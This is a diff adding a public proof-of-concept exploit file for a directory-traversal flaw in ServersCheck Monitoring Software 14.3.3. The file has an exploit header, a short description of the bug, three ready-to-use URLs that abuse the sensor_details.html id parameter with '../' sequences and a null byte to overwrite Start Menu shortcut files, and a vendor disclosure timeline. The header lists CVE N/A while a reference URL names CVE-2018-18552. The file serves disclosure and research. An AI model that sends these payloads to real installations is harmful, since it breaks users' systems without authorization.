@@ -1,0 +1,41 @@
+# Exploit Title: ServersCheck Monitoring Software 14.3.3 - Denial of Service (PoC)
+# Author: John Page (aka hyp3rlinx)
+# Date: 2018-10-23
+# Vendor: www.serverscheck.com
+# Software Link: http://downloads.serverscheck.com/monitoring_software/setup.exe
+# CVE: N/A
+# References: 
+# http://hyp3rlinx.altervista.org/advisories/CVE-2018-18552-SERVERSCHECK-MONITORING-SOFTWARE-ARBITRARY-FILE-WRITE-DOS.txt
+# https://serverscheck.com/monitoring-software/release.asp
+# Affected Component: "sensor_details.html" webpage the "id" parameter
+
+# Security Issue
+# ServersCheck Monitoring Software allows remote attackers to cause a denial of service 
+# (menu functionality loss) by creating an LNK file that points to a second LNK file, if this 
+# second LNK file is associated with a Start menu item. Ultimately, this behavior comes 
+# from a Directory Traversal bug (via the sensor_details.html id parameter) that allows 
+# creating empty files in arbitrary directories. 
+
+# Exploit/POC
+# DOS Command Prompt .LNK under Start Menu change <VICTIM> to desired user.
+
+http://127.0.0.1:1272/sensor_details.html?id=../../../../Users/<VICTIM>/AppData/Roaming/Microsoft/Windows/Start%20Menu/Programs/Accessories/Command%20Prompt.lnk%00
+
+# DOS Run .LNK under Start Menu 
+
+http://127.0.0.1:1272/sensor_details.html?id=../../../../Users/<VICTIM>/AppData/Roaming/Microsoft/Windows/Start%20Menu/Programs/Accessories/Run.lnk%00
+
+# DOS Internet Explorer .LNK from Start Menu 
+http://127.0.0.1:1272/sensor_details.html?id=../../../../Users/<VICTIM>/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Internet Explorer.LNK%00
+
+# Victim will get error message from server like "Error retrieving sensor details from database".
+# Then,No Internet Explorer, Command or Run prompt via the Start/Programs/Accessories/ 
+# and Task Menu links. However, can still be launch by other means. Tested successfully on 
+# Windows 7 OS
+
+# [Disclosure Timeline]
+# Vendor Notification: October 6, 2018
+# Vendor acknowledgement: October 7, 2018
+# Vendor release v14.3.4 : October 7th, 2018 
+# CVE assign by Mitre: October 21, 2018
+# October 22, 2018 : Public Disclosure
